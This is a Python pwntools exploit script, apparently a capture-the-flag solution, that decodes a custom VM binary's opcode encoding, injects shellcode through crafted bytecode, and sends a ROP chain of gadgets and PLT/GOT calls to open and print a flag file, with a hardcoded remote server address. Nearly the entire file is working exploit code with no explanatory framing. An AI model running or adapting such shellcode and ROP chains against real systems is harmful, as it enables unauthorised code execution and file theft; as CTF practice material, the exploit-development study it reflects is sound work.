from pwn import *

def start_exploit(payload, is_remote = None):
        with open("./exploit", 'wb') as f:
                f.write(payload)

        if is_remote:
                p = remote("3.36.163.17", 5334)
                p.sendlineafter(b">>> ", payload.hex())
                print(payload.hex())
                return p

        else:
                #pause()
                p = process(["./vm", './exploit'])
                return p

with open("./vm", 'rb') as f:
        data = f.read()
        init_code = data[0x3b00:0x3b2a]
        all_opcode = data[0x3b2a:0x3f10]
        #all_opcode = [i for i in all_opcode if i not in {0}]
        #print(disasm(init_code, arch='amd64'))
        #print(disasm(what_code, arch='amd64'))
        #print(hexdump(all_opcode))

e = ELF("./vm")
# i = 0
# while True:
#       try:
#               print("============== %d ==============" % i)
#               print(disasm(all_opcode[i+1:i+4], arch='amd64'))
#               i += 4
#       except:
#               break

'''
# argc = 0 ( jmp 0 byte )
opcode 0 [ nop ]

opcode 1 [ idk ]
opcode 2 [ idk ]
opcode 3 [ idk ]
=> argv 1 ( jmp 8byte )

# argc = 2 ( jmp 16byte )
opcode 4
-       case ( 0,1,2,3,4,5 )             -> 48 81 {?} { ARGV[1] }
-       case ( 9,10,11,12,13,14,15 ) -> 49 81 {?} { ARGV[1] }

opcode 5
-       case ( 0,1,2,3,4,5 )             -> 48 81 {?} { ARGV[1] }
-       case ( 9,10,11,12,13,14,15 ) -> 49 81 {?} { ARGV[1] }

opcode 6
-       case ( 0,1,2,3,4,5 )             -> 48 69 {?} { ARGV[1] }
-       case ( 9,10,11,12,13,14,15 ) -> 49 69 {?} { ARGV[1] }

opcode 7
-       case ( 0,1,2,3,4,5 )             -> 48 81 {?} { ARGV[1] }
-       case ( 9,10,11,12,13,14,15 ) -> 49 81 {?} { ARGV[1] }

# argc 3 ( jmp 24byte )
opcode 8 [ MOV ]
-       if ( argv_Type == 1 )
        -       case ( ARGV[1] ) ( 0 ~ 15 )     -> {?} {?} { ARGV[2] }

-       if ( argv_Type == 0 )
        -       case ( ARGV[1] ) [0 ~ 5] // 8 bytes
                -       case ( 0 ~ 5 )  -> 48 89 {?}    return
                -       case ( 9 ~ 15 ) -> 4c 89 {?}    return

        -       case ( ARGV[1] ) [9 ~ 15]
                -       case ( 0 ~ 5 )  -> 49 89 {?}    return
                -       case ( 9 ~ 15 ) -> 4d 89 {?}    return

'''

pay = b''
pay += p8(3)
pay += p64(0x2a)

pay = pay*0x9

pay += p8(8)
pay += p64(1)
pay += p64(0xd)
pay += b"\x80\xF2\xFF\x48\x89\xE6\x0F\x05"

p = start_exploit(pay, is_remote=0)
pause()

prdi = 0x00402c23
prsi = 0x00402c21
read = 0x00000000004010A0

pay = b''
pay += p64(prdi)
pay += p64(0)

pay += p64(prsi)
pay += p64(0x4060c0 + 0x20)
pay += p64(0)

pay += p64(read) # read

pay += p64(prdi)
pay += p64(0x4060c0 + 0x20)
pay += p64(prsi)
pay += p64(0) * 2

pay += p64(e.plt['open'])

_pop = 0x0000000000402C1A
_call = 0x0000000000402C00

pay += p64(_pop)
pay += p64(0)
pay += p64(1)
pay += p64(3)
pay += p64(0x4060e0)
pay += p64(0x100)
pay += p64(e.got['read'])
pay += p64(_call)

pay += p64(0) # dummy
pay += p64(0)
pay += p64(0)
pay += p64(0x4060e0)
pay += p64(0)
pay += p64(0)
pay += p64(e.got['puts'])
pay += p64(_call)
print(hex(len(pay)))
p.send(pay)

sleep(1)
p.send("./flag")

p.interactive()
